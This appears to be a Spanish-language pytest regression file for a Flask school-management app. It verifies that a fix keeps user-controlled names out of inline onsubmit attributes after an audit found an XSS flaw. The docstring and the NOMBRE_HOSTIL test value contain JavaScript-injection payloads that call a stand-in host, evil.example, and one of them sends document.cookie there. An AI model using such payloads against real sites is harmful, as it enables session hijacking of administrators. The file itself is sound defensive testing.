"""
Pruebas anti-regresión del XSS en confirmaciones inline (hallazgo #1 de la
auditoría, plan de remediación paso 1).

CONTEXTO: expediente.html, usuarios.html, gestionar_materias.html y
cobros.html (este último, hallazgo detectado después del cierre del
paso 1 -- mismo patrón, cargo.concepto en vez del nombre de un alumno)
arman `onsubmit="return confirm('...{{ variable }}...')"`. Jinja escapa la
comilla a &#39;, pero el NAVEGADOR decodifica esa entidad ANTES de tratar
el contenido del atributo como código JavaScript -- así que un nombre con
`'); fetch('https://evil.example', {method:'POST', body:document.cookie}); //`
rompe el string de JS y ejecuta lo que sigue. El de expediente.html es
alcanzable por un aspirante anónimo (registro público) contra la sesión de
un Directivo que abra su expediente.

Esto no se puede reproducir ejecutando JS de verdad en un test de Flask
(no hay navegador), pero el patrón vulnerable es detectable a nivel de
HTML: cualquier valor de usuario dentro de un atributo `onXXX="..."` es
el bug, sin importar cómo se escape, porque el navegador lo decodifica
antes de ejecutarlo como script. La corrección lo saca del atributo de
evento y lo pasa a `data-*` (inerte: solo se lee como texto vía
`.dataset`, nunca se interpreta como JS).
"""

import re

from tests.conftest import crear_plan, crear_materia, crear_alumno, crear_usuario, login

from app import EstatusAlumno, RolUsuario, db, Cargo, EstatusCargo


NOMBRE_HOSTIL = "Ana'); fetch('https://evil.example',{method:'POST'}); //"


def _sin_variable_en_atributo_evento(html: bytes, valor: str) -> bool:
    """
    True si `valor` no aparece dentro de ningún atributo onXXX="..." del
    HTML. Cubre tanto el texto crudo como su forma escapada por Jinja
    (&#39; en vez de '), que es como realmente viajaría en la respuesta.
    """
    # (?<!\w) evita falsos positivos como data-concepto="..." (contiene la
    # subcadena "oncepto", que sin el lookbehind coincidiría con on\w+=).
    atributos_evento = re.findall(r'(?<!\w)on\w+="([^"]*)"', html.decode('utf-8'))
    fragmento = valor.split("'")[0]  # "Ana" -- basta para detectar si el nombre se coló
    return not any(fragmento in atributo for atributo in atributos_evento)


def test_expediente_no_mete_el_nombre_del_alumno_en_onsubmit(client, app):
    """El formulario de avanzar cuatrimestre no debe llevar el nombre en un atributo de evento."""
    plan = crear_plan()
    crear_usuario(rol=RolUsuario.DIRECTIVO)
    alumno = crear_alumno(plan, nombre=NOMBRE_HOSTIL, estatus=EstatusAlumno.ACTIVO)
    login(client, 'directivo1', 'clave12345')

    respuesta = client.get(f'/alumno/{alumno.matricula_id}/expediente')

    assert respuesta.status_code == 200
    assert _sin_variable_en_atributo_evento(respuesta.data, NOMBRE_HOSTIL), (
        'El nombre del alumno sigue viajando dentro de un atributo onXXX="..."; '
        'un navegador decodifica &#39; antes de ejecutar ese JS, así que sigue siendo XSS.'
    )
    assert NOMBRE_HOSTIL.split("'")[0].encode() in respuesta.data, (
        'El nombre debería seguir apareciendo en la página (en un data-* o como texto), solo que fuera del atributo de evento'
    )


def test_usuarios_no_mete_el_nombre_en_onsubmit(client, app):
    """El formulario de activar/desactivar cuenta no debe llevar el nombre en un atributo de evento."""
    crear_usuario(username='directivo1', rol=RolUsuario.DIRECTIVO, nombre='Directivo Uno')
    crear_usuario(username='capturador1', rol=RolUsuario.CAPTURADOR, nombre=NOMBRE_HOSTIL)
    login(client, 'directivo1', 'clave12345')

    respuesta = client.get('/usuarios')

    assert respuesta.status_code == 200
    assert _sin_variable_en_atributo_evento(respuesta.data, NOMBRE_HOSTIL), (
        'El nombre del usuario sigue viajando dentro de un atributo onXXX="..."'
    )


def test_gestionar_materias_no_mete_el_nombre_en_onsubmit(client, app):
    """El formulario de eliminar materia no debe llevar el nombre de la materia en un atributo de evento."""
    plan = crear_plan()
    crear_usuario(rol=RolUsuario.DIRECTIVO)
    crear_materia(plan, nombre=NOMBRE_HOSTIL, cuatrimestre=1)
    login(client, 'directivo1', 'clave12345')

    respuesta = client.get(f'/planes/{plan.id}/materias')

    assert respuesta.status_code == 200
    assert _sin_variable_en_atributo_evento(respuesta.data, NOMBRE_HOSTIL), (
        'El nombre de la materia sigue viajando dentro de un atributo onXXX="..."'
    )


def test_cobros_no_mete_el_concepto_del_cargo_en_onsubmit(client, app):
    """
    El formulario de cancelar cargo no debe llevar cargo.concepto en un
    atributo de evento. A diferencia de los otros 3, el dato viene del
    catálogo interno de conceptos de cobro (texto libre capturado por
    Directivo/Contador, sin restricción de caracteres) -- no es
    explotable por un usuario público, pero es el mismo defecto
    estructural y permite escalar de un rol interno a otro.
    """
    plan = crear_plan()
    crear_usuario(rol=RolUsuario.DIRECTIVO)
    alumno = crear_alumno(plan, estatus=EstatusAlumno.ACTIVO)
    db.session.add(Cargo(
        matricula_fk=alumno.matricula_id,
        concepto=NOMBRE_HOSTIL,
        monto=1000,
        estatus=EstatusCargo.PENDIENTE,
    ))
    db.session.commit()
    login(client, 'directivo1', 'clave12345')

    respuesta = client.get(f'/alumno/{alumno.matricula_id}/cobros')

    assert respuesta.status_code == 200
    assert _sin_variable_en_atributo_evento(respuesta.data, NOMBRE_HOSTIL), (
        'El concepto del cargo sigue viajando dentro de un atributo onXXX="..."'
    )
